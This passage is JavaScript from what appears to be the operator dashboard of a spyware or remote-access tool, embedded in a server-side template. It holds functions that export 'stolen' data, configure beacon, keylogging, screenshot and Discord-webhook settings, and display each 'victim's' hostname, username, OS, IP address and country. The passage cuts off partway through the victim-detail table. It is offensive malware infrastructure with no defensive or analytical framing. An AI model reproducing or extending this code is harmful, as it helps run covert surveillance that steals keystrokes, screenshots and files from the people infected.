        function exportStolenData() {{
            window.location.href = '/api/export/stolen?format=json';
        }}
        
        function saveSettings() {{
            const settings = {{
                beacon_interval: document.getElementById('beaconInterval').value,
                screenshot_quality: document.getElementById('screenshotQuality').value,
                keylog_interval: document.getElementById('keylogInterval').value,
                file_size_limit: document.getElementById('fileSizeLimit').value * 1048576,
                discord_webhook: document.getElementById('discordWebhook').value,
                email_notifications: document.getElementById('emailNotifications').checked
            }};
            
            fetch('/api/settings', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify(settings)
            }})
            .then(() => alert('Settings saved'));
        }}
        
        function showVictimDetails(victimId) {{
            fetch(`/api/victim/${{victimId}}`)
                .then(r => r.json())
                .then(data => {{
                    const modal = document.getElementById('victimDetailModal');
                    const body = document.getElementById('modalBody');
                    
                    body.innerHTML = `
                        <div class="two-column">
                            <div>
                                <h4>System Information</h4>
                                <table style="width: 100%;">
                                    <tr><td>Victim ID:</td><td>${{data.victim_id}}</td></tr>
                                    <tr><td>Hostname:</td><td>${{data.hostname}}</td></tr>
                                    <tr><td>Username:</td><td>${{data.username}}</td></tr>
                                    <tr><td>OS:</td><td>${{data.os_type}} ${{data.os_version}}</td></tr>
                                    <tr><td>IP Address:</td><td>${{data.ip_address}}</td></tr>
                                    <tr><td>Country:</td><td>${{getCountryFlag(data.country_code)}} ${{data.country_name}}</td></tr>
